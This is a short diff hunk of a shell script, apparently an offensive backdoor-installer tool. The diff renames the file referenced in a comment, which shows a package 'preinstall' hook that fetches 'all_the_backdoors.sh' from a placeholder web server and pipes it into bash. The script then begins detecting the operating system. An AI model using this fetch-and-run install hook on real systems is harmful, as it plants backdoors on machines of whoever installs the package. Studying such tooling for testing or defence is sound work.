@@ -1,4 +1,4 @@
-#loaded with "preinstall": "wget -q -O - http://WEBSERVER_IP:WEBSERVER_PORT/allthebackdoors.sh | bash"
+#loaded with "preinstall": "wget -q -O - http://WEBSERVER_IP:WEBSERVER_PORT/all_the_backdoors.sh | bash"
 unameOut="$(uname -s)"
 case "${unameOut}" in
     Linux*)     machine=Linux;;
